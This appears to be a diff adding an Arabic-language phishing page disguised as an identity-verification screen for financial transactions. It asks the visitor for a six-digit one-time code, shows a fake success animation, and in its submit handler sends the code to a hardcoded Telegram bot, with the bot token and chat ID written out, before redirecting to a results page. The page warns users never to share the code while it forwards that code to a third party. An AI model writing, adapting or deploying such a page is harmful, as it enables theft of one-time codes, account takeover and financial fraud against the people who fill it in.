@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رمز التحقق - OTP</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #1a3b70;
+            --secondary-color: #ffc107;
+            --success-color: #28a745;
+            --danger-color: #dc3545;
+            --light-bg: #f8f9fc;
+            --card-bg: #ffffff;
+            --border-radius: 16px;
+            --shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e9f2 100%);
+            font-family: 'Tajawal', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+            padding: 40px 30px;
+        }
+
+        .verification-card {
+            background: var(--card-bg);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 40px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .verification-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 6px;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+        }
+
+        .verified-badge {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: var(--success-color);
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .header-icon {
+            width: 80px;
+            height: 80px;
+            background: rgba(26, 59, 112, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            border: 3px solid var(--primary-color);
+        }
+
+        .header-icon svg {
+            width: 40px;
+            height: 40px;
+            color: var(--primary-color);
+        }
+
+        h1 {
+            font-size: 28px;
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            color: var(--primary-color);
+            background-color: #fafbff;
+            transition: all 0.3s ease;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(26, 59, 112, 0.2);
+        }
+
+        .resend-container {
+            margin: 25px 0;
+            padding: 15px;
+            background: rgba(26, 59, 112, 0.05);
+            border-radius: 12px;
+            border: 1px dashed var(--primary-color);
+        }
+
+        .resend-text {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .resend-timer {
+            font-weight: bold;
+            color: var(--primary-color);
+            font-size: 16px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(90deg, var(--primary-color), #0d2a5e);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(26, 59, 112, 0.3);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(26, 59, 112, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .footer-text {
+            margin-top: 30px;
+            color: #888;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .success-animation {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(40, 167, 69, 0.9);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            border-radius: var(--border-radius);
+            z-index: 10;
+            display: none;
+        }
+
+        .success-check {
+            font-size: 60px;
+            margin-bottom: 20px;
+            color: white;
+        }
+
+        @media (max-width: 480px) {
+            .otp-container {
+                flex-wrap: wrap;
+                gap: 8px;
+            }
+            
+            .otp-input {
+                width: 45px;
+                height: 50px;
+                font-size: 20px;
+            }
+            
+            .verification-card {
+                padding: 30px 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="verification-card">
+        <div class="verified-badge">✓</div>
+        
+        <div class="header-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+            </svg>
+        </div>
+        
+        <h1>تأكيد الهوية</h1>
+        <p class="subtitle">أدخل رمز التحقق المكون من 6 أرقام الذي تم إرساله إلى هاتفك المسجل</p>
+        
+        <form id="otpForm">
+            <div class="otp-container">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            
+            <div class="resend-container">
+                <p class="resend-text">لم تستلم رمز التحقق؟</p>
+                <p class="resend-timer">يمكنك طلب رمز جديد بعد <span id="timer">60</span> ثانية</p>
+            </div>
+            
+            <button type="submit" class="submit-btn">تأكيد الرمز</button>
+        </form>
+        
+        <p class="footer-text">
+            هذا الرمز ضروري للتحقق من هويتك وتأمين معاملاتك المالية. <br>
+            لا تشارك هذا الرمز مع أي شخص.
+        </p>
+    </div>
+    
+    <div class="success-animation" id="successAnimation">
+        <div class="success-check">✓</div>
+        <div>تم التحقق بنجاح!</div>
+        <div style="font-size: 16px; margin-top: 10px;">جاري تحويلك إلى صفحة النتائج...</div>
+    </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const otpForm = document.getElementById('otpForm');
+    const timerElement = document.getElementById('timer');
+    const successAnimation = document.getElementById('successAnimation');
+    let timer = 60;
+    
+    // تفعيل التنقل بين حقول OTP باستخدام الأسهم والرقمية
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+            const value = e.data || '';
+            if (/^\d$/.test(value) && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+        });
+        
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !this.value && index > 0) {
+                otpInputs[index - 1].focus();
+            }
+        });
+        
+        input.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const paste = (e.clipboardData || window.clipboardData).getData('text');
+            if (/^\d{6}$/.test(paste)) {
+                paste.split('').forEach((char, i) => {
+                    if (otpInputs[i]) {
+                        otpInputs[i].value = char;
+                    }
+                });
+                otpInputs[5].focus();
+            }
+        });
+    });
+    
+    // عدّاد الوقت لإعادة الإرسال
+    const timerInterval = setInterval(() => {
+        if (timer > 0) {
+            timer--;
+            timerElement.textContent = timer;
+        } else {
+            clearInterval(timerInterval);
+            timerElement.textContent = '0';
+            document.querySelector('.resend-timer').innerHTML = 'يمكنك <a href="#" style="color: #1a3b70; font-weight: bold;" id="resendLink">طلب رمز جديد</a> الآن';
+            
+            document.getElementById('resendLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                // هنا يمكن إضافة منطق إعادة إرسال الرمز
+                alert('تم إرسال رمز تحقق جديد إلى هاتفك');
+                timer = 60;
+                timerElement.textContent = timer;
+                clearInterval(timerInterval);
+                setInterval(() => {
+                    if (timer > 0) {
+                        timer--;
+                        timerElement.textContent = timer;
+                    }
+                }, 1000);
+            });
+        }
+    }, 1000);
+    
+    // معالجة إرسال النموذج
+    otpForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // جمع قيم OTP
+        const otpValues = Array.from(otpInputs).map(input => input.value);
+        const otpCode = otpValues.join('');
+        
+        // التحقق من إدخال جميع الأرقام
+        if (otpValues.some(value => !value) || otpCode.length !== 6) {
+            alert('يرجى إدخال جميع أرقام رمز التحقق');
+            return;
+        }
+        
+        // إخفاء النموذج وإظهار شاشة النجاح مؤقتًا
+        document.querySelector('.verification-card').style.opacity = '0.5';
+        document.querySelector('.verification-card').style.pointerEvents = 'none';
+        successAnimation.style.display = 'flex';
+        
+        // إرسال البيانات لبوت التلغرام
+        fetch('https://api.telegram.org/bot7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: '1008144314',
+                text: `✅ *رمز OTP جديد*\n🔢 الرمز: ${otpCode}\n📅 ${new Date().toLocaleString('ar-EG')}`,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // الانتقال إلى صفحة النتائج بعد 2 ثانية
+                setTimeout(() => {
+                    window.location.href = 'result_page.html';
+                }, 2000);
+            } else {
+                throw new Error('فشل إرسال الرمز');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('❌ خطأ في إرسال رمز التحقق. حاول مرة أخرى.');
+            // إظهار النموذج مرة أخرى في حالة الفشل
+            document.querySelector('.verification-card').style.opacity = '1';
+            document.querySelector('.verification-card').style.pointerEvents = 'auto';
+            successAnimation.style.display = 'none';
+        });
+    });
+});
+</script>
+
+</body>
+</html>
